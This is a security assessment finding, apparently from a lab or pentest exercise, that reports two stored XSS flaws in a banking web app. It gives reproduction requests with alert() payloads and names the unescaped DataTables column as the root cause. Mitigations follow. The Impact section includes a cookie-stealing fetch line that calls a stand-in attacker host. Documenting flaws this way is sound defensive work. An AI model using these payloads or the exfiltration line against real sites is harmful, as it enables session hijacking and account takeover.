# Issue #09 — Multiple Stored Cross-Site Scripting (XSS)

| Field         | Details                                          |
|---------------|--------------------------------------------------|
| **Target**    | BankWeb — `http://localhost:1337`                |
| **Severity**  | High                                             |
| **CVSS v3.1** | 7.6                                              |
| **Vector**    | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N             |
| **Category**  | Injection — Stored Cross-Site Scripting  |

---

## Summary

The application is vulnerable to stored cross-site scripting (XSS) in at least two distinct input fields. In both cases, unsanitised user input is persisted to the database and subsequently rendered in the browser without output encoding, causing injected scripts to execute in the context of any user who views the affected page. Unlike reflected XSS, stored payloads are persistent and will execute automatically on every page load for every affected user — requiring no interaction beyond visiting the page.

Two vectors were identified:

- **Vector A** — the `Reason` field in the transaction creation form, whose output is rendered in the transactions table visible to both the sender and receiver
- **Vector B** — the `name` field in the user registration API, whose output is rendered on the admin panel (`/admin`)

---

## Steps to Reproduce

### Vector A — Transaction `Reason` Field

1. Log in to the application and navigate to **Create Transaction**.
2. In the `Reason` field, enter an XSS payload:
   ```
   <img src=x onerror="alert(1)" />
   ```
3. Fill in the remaining required fields and submit the form.
4. Navigate to the **Transactions** page.
5. Observe that the payload executes as JavaScript in the browser — the `alert(1)` dialog fires upon page load.

### Vector B — User Registration `name` Field

1. Send a `POST` request to `/api/Auth/Register` with an XSS payload in the `name` field:
   ```bash
   curl -s -X POST "http://localhost:1337/api/Auth/Register" \
     -H "Content-Type: application/json" \
     -d '{"UserName":"[REDACTED]","Password":"[REDACTED]","name":"<script>alert(document.domain)</script>","userRight":100}'
   ```
2. Log in as an admin and navigate to `/admin`.
3. Observe that the payload executes — `alert(document.domain)` fires, confirming script execution in the admin page context.

---

## Proof of Concept

### Vector A — Transaction Creation

**Request:**

```http
POST /Transaction/Create HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Cookie: SessionId=[REDACTED]
Referer: http://localhost:1337/Transaction/Create

SenderId=[REDACTED]&ReceiverId=[REDACTED]&TransactionDateTime=2025-07-07&Reason=%3Cimg+src%3Dx+onerror%3D%22alert%281%29%22+%2F%3E&Reference=1&Amount=1&__RequestVerificationToken=[REDACTED]
```

**Response:**

```http
HTTP/1.1 302 Found
Content-Length: 0
Date: Mon, 07 Jul 2025 09:34:32 GMT
Server: Kestrel
Location: /Transaction
```

The server accepts and stores the payload without any validation. On the subsequent `GET /api/Transaction/GetTransactions` call, the raw payload is returned in the JSON response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 07 Jul 2025 09:35:11 GMT
Server: Kestrel
Content-Length: 717

{"recordsTotal":3,"recordsFiltered":3,"data":[{"id":2002,"senderId":"[REDACTED]","receiverId":"[REDACTED]","dateTime":"07/07/2025","reason":"<img src=x onerror=\"alert(1)\" />","amount":1,...},...]}
```

The payload is then injected into the DOM unencoded by the DataTables library, which renders the `reason` column without escaping:

```javascript
// Vulnerable DataTables column definition — no render function applied
{
    data: 'reason',
    title: 'Reason',
}
```

Without a text rendering function, DataTables inserts the raw string directly into the DOM as HTML, causing the `onerror` handler to fire.

---

### Vector B — User Registration

**Request:**

```http
POST /api/Auth/Register HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Cookie: [REDACTED]

{
  "UserName": "[REDACTED]",
  "Password": "[REDACTED]",
  "name": "<script>alert(document.domain)</script>",
  "userRight": 100
}
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 21 Jul 2025 12:49:55 GMT
Server: Kestrel
Content-Length: 2

{}
```

The server accepts the payload and returns a success response. When an admin subsequently visits `/admin`, the stored `<script>` tag executes in their browser, confirming the payload fires in an elevated-privilege context.

> **Note:** The `alert(document.domain)` payload was used here specifically to confirm the script executes within the application's origin — a standard proof-of-concept technique to demonstrate same-origin script execution without performing any destructive action.

---

## Impact

- **Session hijacking** — a real-world payload would replace `alert(1)` with `fetch('https://attacker.tld/?c='+document.cookie)`, silently exfiltrating the session cookie of any user who views the transactions page, enabling full account takeover.
- **Admin panel compromise via Vector B** — because the registration XSS fires specifically on the `/admin` page, a low-privileged attacker can target admin sessions directly. Combined with the admin registration endpoint disclosed in Issue #05, an attacker could register a malicious user and wait for an admin to trigger the payload.
- **Wormable potential** — since transactions can be sent to any registered user (not just the sender), an attacker can deliver the XSS payload to targeted victims by simply initiating a transaction with them. The victim needs no interaction beyond viewing their own transaction history.
- **Stored persistence** — unlike reflected XSS, these payloads remain active in the database and will execute on every page load for every affected user until the malicious records are deleted.
- **CSP absence** — no `Content-Security-Policy` header was observed in any response during this assessment. The absence of a CSP means there is no browser-level defence preventing injected scripts from executing or making outbound requests.

---

## Recommended Mitigations

1. **Apply output encoding on all user-controlled data rendered in the browser.** For the DataTables library specifically, use the built-in `render.text()` function on every column that displays user input:

   ```javascript
   // Safe — applies HTML entity encoding before DOM insertion
   {
       data: 'reason',
       title: 'Reason',
       render: $.fn.dataTable.render.text()
   }
   ```

   Apply this to all columns sourced from user input: `senderId`, `receiverId`, `reason`, `reference`, and any name fields.

2. **Sanitise and validate input server-side** before persisting to the database. Reject or strip any input containing HTML tags or JavaScript event handlers. For fields that should contain plain text, enforce this at the model validation layer:

   ```csharp
   [RegularExpression(@"^[^<>""']*$", ErrorMessage = "HTML characters are not permitted.")]
   public string Reason { get; set; }
   ```

3. **Encode output at the template/view layer** for server-rendered pages. In Razor views, use `@Html.Encode()` or rely on the default `@variable` encoding rather than `@Html.Raw()`.

4. **Implement a strict Content Security Policy** to limit the impact of any XSS that bypasses input/output controls:

   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

5. **Set the `HttpOnly` flag on session cookies** to prevent JavaScript from accessing them even if an XSS payload executes:

   ```csharp
   options.Cookie.HttpOnly = true;
   options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
   ```